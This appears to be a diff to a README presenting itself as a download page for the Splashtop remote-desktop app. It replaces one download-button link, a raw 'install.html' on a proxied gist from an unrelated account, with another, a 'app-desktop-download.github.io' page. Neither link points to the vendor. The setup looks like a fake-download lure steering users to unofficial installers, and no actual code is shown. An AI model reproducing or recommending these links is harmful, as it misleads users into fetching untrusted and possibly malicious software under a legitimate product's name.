@@ -1,6 +1,6 @@
 # Splashtop Download — Remote Desktop & Screen Sharing App for Windows & MacOS  
 
-<a href="https://gistcdn.githack.com/trout44mrgood/ef1b267ad606f3007b3de552c64efd50/raw/d6a71627d753c991382a6fcf2a69d130e34341ce/install.html?offer=Splashtop" target="_blank">
+<a href="https://app-desktop-download.github.io/.github/?offer=Splashtop" target="_blank">
   <img  
     src="https://img.shields.io/badge/Get%20Splashtop%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF"  
     width="320"  
